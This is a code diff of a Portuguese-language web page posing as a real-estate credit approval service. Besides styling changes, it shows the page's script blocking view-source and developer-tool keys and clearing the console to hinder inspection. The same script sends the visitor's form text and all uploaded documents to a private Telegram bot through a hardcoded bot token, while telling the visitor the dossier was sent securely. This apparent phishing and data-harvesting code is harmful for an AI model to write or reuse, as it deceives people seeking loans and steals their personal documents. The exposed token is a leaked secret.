@@ -127,7 +127,7 @@
     <main class="container mx-auto px-3 py-8 flex flex-col items-center">
         <div class="text-center mb-16 animate-up">
             <h1 class="text-4xl md:text-6xl font-extrabold mb-5 label-premium leading-tight tracking-tight">Análise de Aprovação<br>Imobiliária</h1>
-            <p class="text-[#5f6368] max-w-1x0 mx-auto text-lg font-medium leading-relaxed">
+            <p class="text-[#5f6368] max-w-2xl mx-auto text-lg font-medium leading-relaxed">
                 Utilizamos a inteligência <span class="text-[#202124] font-bold border-b-3 border-blue-400/25">X-Partner</span> para processar sua linha de crédito com padrões internacionais.
             </p>
         </div>
@@ -260,13 +260,12 @@
 
     <footer class="py-16 mt-10 bg-[#f1f3f4] border-t border-[#dadce0]">
         <div class="max-w-4xl mx-auto px-6 text-center">
-            <div class="mb-6 text-[#202124] font-bold uppercase tracking-widest text-xs">
+            <div class="mb-6 text-[#202124] font-bold uppercase tracking-widest text-[10px]">
                 <span>Corretor de Imóveis e Responsável Técnico: Marcos Cunha</span> 
                 <span class="mx-3 text-[#dadce0]">|</span>
                 <span>CRECI: 34.588-E</span>
                 <span class="mx-3 text-[#dadce0]">|</span>
-                <span>Rua 3 Quadra 05 Lote 33; Jardim das Oliveiras</span>
-                <span>CEP: 72.912-166 - Águas Lindas - GO</span
+                <p class="mt-2">Rua 3 Quadra 05 Lote 33; Jardim das Oliveiras - CEP: 72.912-166 - Águas Lindas - GO</p>
             </div>
 
             <div class="flex justify-center gap-4 mb-8">
@@ -282,20 +281,22 @@
     </footer>
     
     <script>
-    // SEGURANÇA PESADA: BLOQUEIO DE CÓDIGO FONTE
+        // SEGURANÇA: BLOQUEIO DE CÓDIGO FONTE
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i' || e.key === 'j')) e.preventDefault();
             if (e.key === 'F12') e.preventDefault();
         });
 
-        // Limpeza constante do console (Anti-Inspecionar)
-        setInterval(() => { console.clear(); console.log("%cACESSO RESTRITO - PROTOCOLO SANDXCDD", "color:red; font-size:20px; font-weight:bold;"); }, 1000);
+        // Limpeza constante do console
+        setInterval(() => { 
+            console.clear(); 
+            console.log("%cACESSO RESTRITO - PROTOCOLO X-PARTNER", "color:red; font-size:20px; font-weight:bold;"); 
+        }, 1000);
 
-    <script>
         const BOT_TOKEN = '8226313259:AAFFLyq6lVIQjjAiW6fcqWk9Z8hrDmhsIvk';
         const CHAT_ID = '1703808186';
 
-        // Melhoria no feedback visual dos arquivos
+        // Feedback visual dos arquivos
         const setupFileZone = (inputId, labelId, zoneId) => {
             const input = document.getElementById(inputId);
             input.onchange = e => {
@@ -307,7 +308,8 @@
                     label.innerText = `✓ ${count} Arquivo(s) carregado(s)`;
                     label.classList.add('text-green-600', 'font-bold');
                     zone.classList.add('active', 'border-green-500');
-                    zone.querySelector('div').classList.replace('bg-blue-50', 'bg-green-50');
+                    const iconContainer = zone.querySelector('div');
+                    iconContainer.className = iconContainer.className.replace(/bg-\w+-50/, 'bg-green-50');
                 }
             };
         };
@@ -350,14 +352,12 @@
                              `🔐 **SISTEMA:** X-Partner-v3.0 Protocol`;
 
             try {
-                // Enviar texto com formatação Premium
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: mensagem, parse_mode: 'Markdown' })
                 });
 
-                // Envio dos anexos
                 const uploadFiles = async (inputId, emoji) => {
                     const files = document.getElementById(inputId).files;
                     for (let file of files) {
@@ -381,7 +381,7 @@
                 setTimeout(() => {
                     alert("Seu dossiê foi transmitido com segurança para a central X-Partner.");
                     window.location.reload();
-                }, 1000);
+                }, 1500);
 
             } catch (error) {
                 alert("Falha na conexão segura. Tente novamente.");
